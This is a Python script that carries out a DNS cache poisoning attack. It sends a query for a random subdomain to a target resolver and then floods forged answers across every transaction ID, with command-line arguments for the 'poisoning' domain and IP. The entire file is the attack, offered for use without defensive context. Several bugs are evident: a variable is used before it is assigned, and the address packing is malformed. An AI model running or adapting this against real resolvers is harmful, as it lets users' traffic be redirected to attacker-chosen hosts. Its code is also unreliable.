import socket
import select
import struct
import argparse
import random
import threading
import string


class PacketHeader:
    FORMAT = '>HHHHHH'

    def __init__(self, id_, qr, opcode, aa, tc, rd, ra, z,
                 ad, cd, rcode, qcount, an_rrs, au_rrs, ad_rrs):
        self.id_ = id_
        self.qr = qr
        self.opcode = opcode
        self.aa = aa
        self.tc = tc
        self.rd = rd
        self.ra = ra
        self.z = z
        self.ad = ad
        self.cd = cd
        self.rcode = rcode
        self.options = (
            self.qr << 15 |
            self.opcode << 11 |
            self.aa << 10 |
            self.tc << 9 |
            self.rd << 8 |
            self.ra << 7 |
            self.z << 6 |
            self.ad << 5 |
            self.cd << 4 |
            self.rcode
        )
        self.qcount = qcount
        self.an_rrs = an_rrs
        self.au_rrs = au_rrs
        self.ad_rrs = ad_rrs

    def pack(self):
        return struct.pack(
            self.FORMAT,
            self.id_,
            self.options,
            self.qcount,
            self.an_rrs,
            self.au_rrs,
            self.ad_rrs
        )


def encode_domain(domain):
    r_domain = b''
    for part in domain.split('.'):
        part = struct.pack('>b', len(part)) + part.encode()
        r_domain += part
    if not r_domain.endswith(b'\x00'):
        r_domain += b'\x00'
    return r_domain


class QueryPacket:
    BODY_FORMAT = '>HH'

    def __init__(self, qname):
        self.header = PacketHeader(1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0)
        self.packed_header = self.header.pack()
        self.qname = qname
        if isinstance(self.qname, str):
            self.qname = encode_domain(self.qname)
        self.packed_body = self.pack_body()
        self.packed = self.pack()

    def pack_body(self):
        return self.qname + struct.pack(
            self.BODY_FORMAT,
            1,
            1
        )

    def pack(self):
        return self.packed_header + self.packed_body


class ResourceRecord:
    FORMAT = '>HHIH4s'

    def __init__(self, qname, ip):
        self.qname = qname
        if isinstance(self.qname, str):
            self.qname = encode_domain(self.qname)
        self.ip = ip

    def pack(self):
        return self.qname + struct.pack(
            self.FORMAT,
            1,
            1,
            2800,
            4,
            self.ip
        )


class AnswerPacket:
    def __init__(self, id_, q_packet, rdata, domain, ip):
        self.q_packet = q_packet

        self.header = PacketHeader(id_, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1)
        self.packed_header = self.header.pack()

        self.au_res = ResourceRecord(b'\xc0\x0c', rdata)
        self.packed_au_res = self.au_res.pack()

        self.ad_res = ResourceRecord(domain, ip)
        self.packed_ad_res = self.ad_res.pack()

        self.packed = self.pack()

    def pack(self):
        return self.packed_header + self.q_packet.packed_body + \
               self.packed_au_res + self.packed_ad_res


def generate_qname(domain):
    prefix = ''
    for i in range(random.randint(1, 10)):
        prefix += random.choice(string.ascii_lowercase)
    return '%s.%s' % (prefix, domain)


def main(args):
    ids_count = 2 ** 16

    domain = args.domain
    ip = struct.pack('>2s', args.ip.encode())

    packets = []
    for i in range(ids_count):
        id_ = struct.pack('>H', i)
        packets.append(id_ + a_packet)

    for i in range(1000):
        qname = generate_qname(domain)
        q_packet = QueryPacket(qname)

        a_packet = AnswerPacket(
            1,
            q_packet,
            b'1.1.1.1',
            domain, ip
        ).packed[2:]

        packet = iter(packets)

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.sendto(q_packet.packed, (args.target, 53))
            while not select.select([sock], [], [], 1e-10)[0]:
                threading.Thread(target=sock.sendto,
                                 args=(next(packet), (args.target, 53))).start()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('target', help='Target IP')
    parser.add_argument('domain', help='Poisoning domain')
    parser.add_argument('ip', help='Poisoning IP')
    args = parser.parse_args()

    main(args)
